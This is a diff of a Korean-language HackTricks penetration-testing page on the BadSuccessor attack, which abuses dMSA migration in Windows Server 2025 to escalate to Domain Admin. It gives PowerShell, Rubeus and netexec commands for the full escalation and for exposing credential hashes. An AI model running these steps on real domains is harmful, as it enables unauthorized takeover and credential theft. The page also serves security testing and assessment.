@@ -1,67 +1,100 @@
-# Active Directory ACLs/ACEs 악용
+# BadSuccessor
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## 개요
+## Overview
 
-위임된 관리 서비스 계정(**dMSAs**)는 **Windows Server 2025**와 함께 도입된 새로운 AD 주체 유형입니다. 이는 레거시 서비스 계정을 대체하기 위해 설계되었으며, 이전 계정의 서비스 주체 이름(SPN), 그룹 멤버십, 위임 설정 및 심지어 암호화 키를 자동으로 복사하는 원클릭 “마이그레이션”을 허용하여 애플리케이션이 원활하게 전환하고 Kerberoasting 위험을 제거합니다.
+**BadSuccessor**는 **delegated Managed Service Account** (**dMSA**) 마이그레이션 워크플로를 악용하며, 이는 **Windows Server 2025**에서 도입되었습니다. dMSA는 **`msDS-ManagedAccountPrecededByLink`**를 통해 기존 계정과 연결될 수 있고, **`msDS-DelegatedMSAState`**에 저장된 마이그레이션 상태를 통해 이동할 수 있습니다. 공격자가 쓰기 가능한 OU에 dMSA를 생성하고 해당 속성들을 제어할 수 있다면, KDC는 연결된 계정의 **authorization context**를 가진 공격자 제어 dMSA에 대한 티켓을 발급할 수 있습니다.
 
-Akamai 연구원들은 **`msDS‑ManagedAccountPrecededByLink`**라는 단일 속성이 dMSA가 “계승”하는 레거시 계정을 KDC에 알려준다는 것을 발견했습니다. 공격자가 해당 속성을 쓸 수 있고 **`msDS‑DelegatedMSAState` → 2**로 전환할 수 있다면, KDC는 선택한 피해자의 모든 SID를 **상속하는 PAC**를 기꺼이 생성하여 dMSA가 도메인 관리자 포함 모든 사용자를 가장할 수 있게 합니다.
+실제로 이는 위임된 OU 권한만 가진 낮은 권한 사용자가 새 dMSA를 생성하고, 이를 `Administrator`에 연결한 뒤, 마이그레이션 상태를 완료하고, 그 결과 PAC에 **Domain Admins** 같은 권한 그룹이 포함된 TGT를 얻을 수 있음을 의미합니다.
 
-## dMSA란 정확히 무엇인가?
+## dMSA migration details that matter
 
-* **gMSA** 기술 위에 구축되었지만 새로운 AD 클래스 **`msDS‑DelegatedManagedServiceAccount`**로 저장됩니다.
-* **옵트인 마이그레이션**을 지원합니다: `Start‑ADServiceAccountMigration`을 호출하면 dMSA가 레거시 계정에 연결되고, 레거시 계정에 `msDS‑GroupMSAMembership`에 대한 쓰기 권한이 부여되며, `msDS‑DelegatedMSAState`가 1로 전환됩니다.
-* `Complete‑ADServiceAccountMigration` 후, 대체된 계정은 비활성화되고 dMSA는 완전히 기능을 발휘합니다; 이전에 레거시 계정을 사용했던 모든 호스트는 자동으로 dMSA의 비밀번호를 가져올 수 있는 권한을 부여받습니다.
-* 인증 중에 KDC는 **KERB‑SUPERSEDED‑BY‑USER** 힌트를 삽입하여 Windows 11/24H2 클라이언트가 dMSA로 투명하게 재시도하도록 합니다.
+- dMSA는 **Windows Server 2025** 기능입니다.
+- `Start-ADServiceAccountMigration`는 마이그레이션을 **started** 상태로 설정합니다.
+- `Complete-ADServiceAccountMigration`는 마이그레이션을 **completed** 상태로 설정합니다.
+- `msDS-DelegatedMSAState = 1`은 마이그레이션이 시작되었음을 의미합니다.
+- `msDS-DelegatedMSAState = 2`는 마이그레이션이 완료되었음을 의미합니다.
+- 정당한 마이그레이션 중에는 dMSA가 이전 계정을 투명하게 대체하도록 설계되어 있으므로, KDC/LSA는 이전 계정이 이미 가지고 있던 접근 권한을 보존합니다.
 
-## 공격 요구 사항
-1. **최소 하나의 Windows Server 2025 DC**가 필요하여 dMSA LDAP 클래스와 KDC 로직이 존재해야 합니다.
-2. **OU에 대한 객체 생성 또는 속성 쓰기 권한**(모든 OU) – 예: `Create msDS‑DelegatedManagedServiceAccount` 또는 단순히 **Create All Child Objects**. Akamai는 실제 환경의 91%가 비관리자에게 이러한 “무해한” OU 권한을 부여한다고 발견했습니다.
-3. Kerberos 티켓을 요청하기 위해 도메인에 가입된 호스트에서 도구(파워셸/Rubeus)를 실행할 수 있는 능력.
-*피해자 사용자에 대한 제어는 필요하지 않으며, 공격은 대상 계정을 직접 건드리지 않습니다.*
+Microsoft Learn도 마이그레이션 동안 원래 계정이 dMSA에 연결되며, dMSA는 이전 계정이 접근할 수 있던 것에 접근하도록 의도되었다고 설명합니다. BadSuccessor는 바로 이 보안 가정을 악용합니다.
 
-## 단계별: BadSuccessor*권한 상승
+## Requirements
 
-1. **제어할 수 있는 dMSA 찾기 또는 생성하기**
-```bash
-New‑ADServiceAccount Attacker_dMSA `
-‑DNSHostName ad.lab `
-‑Path "OU=temp,DC=lab,DC=local"
+1. **dMSA exists**인 도메인, 즉 AD 측에 **Windows Server 2025** 지원이 존재해야 합니다.
+2. 공격자가 어떤 OU에서 `msDS-DelegatedManagedServiceAccount` 객체를 **create**할 수 있거나, 이에 준하는 광범위한 자식 객체 생성 권한을 가지고 있어야 합니다.
+3. 공격자가 관련 dMSA 속성들을 **write**할 수 있거나, 방금 생성한 dMSA를 완전히 제어할 수 있어야 합니다.
+4. 공격자가 도메인에 조인된 컨텍스트 또는 LDAP/Kerberos에 도달 가능한 터널에서 Kerberos 티켓을 요청할 수 있어야 합니다.
+
+### Practical checks
+
+가장 깔끔한 operator signal은 도메인/포리스트 레벨을 확인하고, 환경이 이미 새로운 Server 2025 스택을 사용 중인지 확인하는 것입니다:
+```powershell
+Get-ADDomain | Select Name,DomainMode
+Get-ADForest | Select Name,ForestMode
+```
+값으로 `Windows2025Domain` 및 `Windows2025Forest`를 보면, **BadSuccessor / dMSA migration abuse**를 우선 점검하세요.
+
+또한 public tooling으로 dMSA 생성을 위해 위임된 writable OU를 열거할 수 있습니다:
+```powershell
+.\Get-BadSuccessorOUPermissions.ps1
 ```
 
-당신이 쓸 수 있는 OU 내에서 객체를 생성했기 때문에, 당신은 자동으로 모든 속성을 소유하게 됩니다.
-
-2. **두 개의 LDAP 쓰기로 “완료된 마이그레이션” 시뮬레이션**:
-- `msDS‑ManagedAccountPrecededByLink = DN`을 피해자의 것으로 설정합니다 (예: `CN=Administrator,CN=Users,DC=lab,DC=local`).
-- `msDS‑DelegatedMSAState = 2`로 설정합니다 (마이그레이션 완료).
-
-**Set‑ADComputer, ldapmodify** 또는 **ADSI Edit**와 같은 도구가 작동하며, 도메인 관리자 권한이 필요하지 않습니다.
-
-3. **dMSA에 대한 TGT 요청** — Rubeus는 `/dmsa` 플래그를 지원합니다:
-
 ```bash
-Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/aka.test /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>
+netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
 ```
+## Abuse flow
 
-반환된 PAC에는 이제 SID 500(관리자) 및 도메인 관리자/엔터프라이즈 관리자 그룹이 포함됩니다.
+1. dMSA를 생성 권한이 위임된 OU에서 생성합니다.
+2. **`msDS-ManagedAccountPrecededByLink`**를 `CN=Administrator,CN=Users,DC=corp,DC=local` 같은 권한 있는 대상의 DN으로 설정합니다.
+3. 마이그레이션이 완료되었음을 표시하기 위해 **`msDS-DelegatedMSAState`**를 `2`로 설정합니다.
+4. 새 dMSA에 대해 TGT를 요청하고, 반환된 티켓을 사용해 권한 있는 서비스에 접근합니다.
 
-## 모든 사용자 비밀번호 수집
+PowerShell example:
+```powershell
+New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
+Set-ADServiceAccount attacker_dMSA -Add @{
+msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
+}
+Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
+```
+Ticket request / 운영 도구 예시:
+```bash
+Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
+netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
+```
+## 이것이 단순한 privilege escalation보다 더 중요한 이유
 
-정상적인 마이그레이션 중에 KDC는 새로운 dMSA가 **전환 전에 이전 계정에 발급된 티켓을 복호화**할 수 있도록 해야 합니다. 활성 세션을 중단하지 않기 위해, KDC는 **`KERB‑DMSA‑KEY‑PACKAGE`**라는 새로운 ASN.1 블롭 안에 현재 키와 이전 키를 모두 배치합니다.
+정상적인 migration 동안, Windows는 cutover 이전에 이전 account에 대해 발급된 tickets도 처리할 수 있도록 새 dMSA가 필요합니다. 그래서 dMSA 관련 ticket material에는 **`KERB-DMSA-KEY-PACKAGE`** 흐름에서 **current** 및 **previous** keys가 포함될 수 있습니다.
 
-우리의 가짜 마이그레이션이 dMSA가 피해자를 계승한다고 주장하기 때문에, KDC는 피해자의 RC4-HMAC 키를 **이전 키** 목록에 성실히 복사합니다 – dMSA가 “이전” 비밀번호를 가졌던 적이 없더라도 말입니다. 이 RC4 키는 솔트가 없으므로 사실상 피해자의 NT 해시가 되어 공격자에게 **오프라인 크래킹 또는 “패스-더-해시”** 기능을 제공합니다.
+공격자가 제어하는 fake migration에서는, 이 동작으로 인해 BadSuccessor는 다음이 될 수 있습니다:
 
-따라서 수천 명의 사용자를 대량으로 연결하면 공격자가 해시를 “대규모로” 덤프할 수 있게 되어 **BadSuccessor가 권한 상승 및 자격 증명 손상 원시 기능이 됩니다**.
+- PAC에서 privileged group SIDs를 상속받는 **Privilege escalation**
+- 이전 key 처리로 인해 취약한 workflow에서 predecessor의 RC4/NT hash에 해당하는 material이 노출될 수 있으므로 **Credential material exposure**
 
-## 도구
+이 때문에 이 technique은 직접적인 domain takeover뿐 아니라 pass-the-hash 또는 더 광범위한 credential compromise 같은 후속 operation에도 유용합니다.
 
-- [https://github.com/akamai/BadSuccessor](https://github.com/akamai/BadSuccessor)
-- [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
-- [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
+## Patch status에 대한 참고 사항
 
-## 참고 문헌
+원래 BadSuccessor 동작은 **단순한 2025 preview issue가 아닙니다**. Microsoft는 이를 **CVE-2025-53779**로 지정했고 **2025년 8월**에 security update를 배포했습니다. 다음 경우를 위해 이 attack을 문서화해 두십시오:
 
-- [https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
+- **labs / CTFs / assume-breach exercises**
+- **unpatched Windows Server 2025 environments**
+- **assessment 중 OU delegations 및 dMSA exposure 검증**
+
+dMSA가 존재한다고 해서 Windows Server 2025 domain이 취약하다고 가정하지 마십시오. patch level을 확인하고 신중하게 테스트하십시오.
+
+## Tools
+
+- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
+- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
+- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
+
+## References
+
+- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
+- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
+- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
+- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
 
 {{#include ../../../banners/hacktricks-training.md}}
